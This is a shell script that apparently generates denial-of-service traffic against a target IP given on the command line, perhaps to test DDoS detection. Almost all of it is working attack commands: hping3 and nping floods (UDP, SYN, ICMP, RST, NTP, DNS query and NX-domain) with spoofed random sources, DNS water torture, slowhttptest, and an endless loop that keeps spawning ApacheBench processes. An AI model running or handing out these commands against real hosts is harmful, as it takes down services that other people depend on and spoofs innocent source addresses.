#!/bin/sh
# Christopher Gray
# Version 0.1.14
#  10-31-18

if [ -z "$1" ]
then
      echo "No dest defined to attack! please define one before continuing \r\n"
      exit
else
      server_ip=$1
      echo "Server is set to $server_ip \r\n"
fi


if [ -z "$2" ]
then
      echo "Defaulting queries to send is set to: 1500 \r\n"
      queries_ps=1500
else
      queries_ps=$2
      #echo "port = $server_port \r\n"
fi


if [ -f queryfile-example-current ]
then
      echo "Loading Nominum sample data file! \r\n \r\n"
else
      echo "Missing Nominum sample data... downloading it!  \r\n \r\n "
      wget -O "queryfile-example-current.gz" "ftp://ftp.nominum.com/pub/nominum/dnsperf/data/queryfile-example-current.gz"
      echo "Decompressing file... \r\n \r\n"
      gunzip queryfile-example-current.gz
      wait
fi

# https://github.com/cobblau/dnsperf
# Dnsperf supports the following command line options:

# -s     Specifies the DNS server's IP address. The default IP is 127.0.0.1.
# -p     Specifies the DNS server's port. The default Port is 53.
# -d     Specifies the input data file. Input data file contains query domain and query type.
# -t     Specifies the timeout for query completion in millisecond. The default timeout is 3000ms.
# -Q     Specifies the max number of queries to be send. The default number is 1000.
# -c     Specifies the number of concurrent queries. The default number is 100. Dnsperf will randomly pick a query domain from data file as QNAME.
# -l     Specifies how long to run tests in seconds. The default number is infinite.
# -e     This will sets the real client IP in query string following the rules defined in edns-client-subnet.

# -i     Specifies interval of queries in seconds. The default number is zero. This option is not supported currently.
# -P     Specifies the transport layer protocol to send DNS queries, udp or tcp. As we know, although UDP is the suggested protocol, DNS queries can be send either by UDP or TCP. The default is udp. tcp is not supported currently, and it is coming soon.
# -f     Specify address family of DNS transport, inet or inet6. The default is inet. inet6 is not supported currently.
# -v     Verbose: report the RCODE of each response on stdout.
# -h     Print the usage of dnsperf.

if [ -f queryfile-example-current ]
then
      #sudo dnsperf -s $server_ip -d queryfile-example-current -c 200 -T 10 -l 300 -q 10000 -Q 25
      echo "Running DNS Perf to generate alot of ligitimate DNS traffic from Nominum sample data, to the DNS Server. \r\n \r\n"
      sudo dnsperf -s $server_ip -d queryfile-example-current -c 200 -T 10 -l 300 -q 10000 -Q $queries_ps 2> /dev/null &
      wait
fi

if [ -f test.net.txt ]
then
      echo "Running custom created DNS Perf script, which generates alot of benign traffic. \r\n \r\n "
      dnsperf -s $server_ip -d test.net.txt -b 100000  -t 2 -c 100 -q 100000 -l 300 2> /dev/null &
fi

#-----------------------------------------------------------------------------------------------------------------
# Hping3 Attacks
echo "Running HPing3 DNS flood attack script, toward port 53, from random sources... \r\n "
sudo hping3 --flood --rand-source --udp -p 53 $server_ip 2> /dev/null &

echo "Running HPing3 attack script towards FTP... \r\n"
sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source $server_ip 2> /dev/null &

echo "Running HPing3 flood attack to HTTP \r\n "
sudo hping3 $server_ip -p 80 –SF --flood 2> /dev/null &

echo "Running ping flood attack from random sources \r\n"
sudo hping3 $server_ip --icmp --flood --rand-source 2> /dev/null &

echo "Running syn flood attack from random sources, towards a webserver \r\n "
sudo hping3 --syn --flood --rand-source --win 65535 --ttl 64 --data 16000 --morefrag --baseport 49877 --destport 80 $server_ip 2> /dev/null &

#------ Attack traffic ----------
echo "Running NX Domain attack python script... \r\n "
sudo python attack_dns_nxdomain.py $server_ip example.com 10000 2> /dev/null &

echo "Running DNS Water Torture attack against server"
sudo ./attack_dns_watertorture_wget.sh $server_ip 2> /dev/null &

#-----------------------------------------------------------------------------------------------------------------
RATE=5000
SAMPLES=1000000000
OUTPUT=&>/dev/null
NPING_SILENT='-HNq'
VALID_DNS_QUERY="000001000001000000000000037177650474657374036c61620000010001"
INEXISTENT_DNS_QUERY="0000000000010000000000000c6e6f73756368646f6d61696e08696e7465726e616c036c61620000010001"

echo "Performing a DNS query flood \r\n "
sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 53 --data $VALID_DNS_QUERY  $OUTPUT 2> /dev/null &

echo "Performing a NX domain flood \r\n "
sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 53 --data $INEXISTENT_DNS_QUERY $OUTPUT 2> /dev/null &

echo "Performing a NTP flood, from port NTP (Time Protocol) \r\n "
sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 123 --data-length 100 $OUTPUT 2> /dev/null &

echo "Performing a TCP SYN Flood towards SSH \r\n"
sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags SYN -p 22 $OUTPUT 2> /dev/null &

echo "Performing a ICMP Flood \r\n "
sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --icmp $OUTPUT 2> /dev/null &

echo "Performing a RST Flood on TCP towards SSH \r\n "
sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags RST -p 22 $OUTPUT 2> /dev/null &

#-----------------------------------------------------------------------------------------------------------------

#--- Webflow -----
echo "Performing a Slow HTTP Test script against webserver \r\n "
sudo ./slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u https://$server_ip/resources/loginform.html -x 10 -p 3 2> /dev/null &

#---- apache bench attack ----
echo "Starting a Apache bench strest test... \r\n"
while true
do
    ab -r -c 1000 -n 1000000 $server_ip  &>/dev/null &
done

echo "DONE \r\n \r\n"
